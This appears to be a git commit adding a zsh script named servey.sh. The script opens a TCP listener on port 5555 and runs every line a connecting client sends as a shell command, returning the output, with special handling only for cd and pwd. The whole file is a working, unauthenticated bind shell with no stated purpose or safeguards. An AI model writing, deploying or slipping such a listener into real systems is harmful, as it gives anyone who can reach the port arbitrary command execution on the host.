0ef417debee937b0f3299a2368be1eb39a411b62
maxobi243 <maxq338@gmail.com>
2026-02-04 08:03:11 +1000

    Create servey.sh

---
+++ servey.sh
@@ -0,0 +1,49 @@
+#!/bin/zsh
+
+zmodload zsh/net/tcp
+ztcp -l 5555
+listen_fd=$REPLY
+echo "Listining on 5555"
+
+
+while true; do
+    ztcp -a $listen_fd
+    conn_fd=$REPLY
+    echo "client Connected"
+
+    {
+        while read line <&$conn_fd; do
+            cmd=(${=line})
+
+            case "${cmd[1]}" in
+                cd)
+
+                    if [[ -n "${cmd[2]}" ]]; then
+                        if cd "${cmd[2]}" 2>/dev/null; then
+                            print -r -- "OK $(pwd)" >&$conn_fd
+                        else
+                            print -r -- "cd: no such dir" >&$conn_fd
+                        fi
+                    else
+                        cd ~
+                        print -r -- "OK $(pwd)" >&$conn_fd
+                    fi
+                    ;;
+                pwd)
+                    print -r -- "$(pwd)" >&$conn_fd
+                    ;;
+                *)
+                    if output=$("${cmd[@]}" 2>&1); then
+                        print -r -- "$output" >&$conn_fd
+                    else
+                        print -r -- "$output" >&$conn_fd
+                    fi
+                    ;;
+                esac
+        done
+    } &
+    
+done
+
+
+
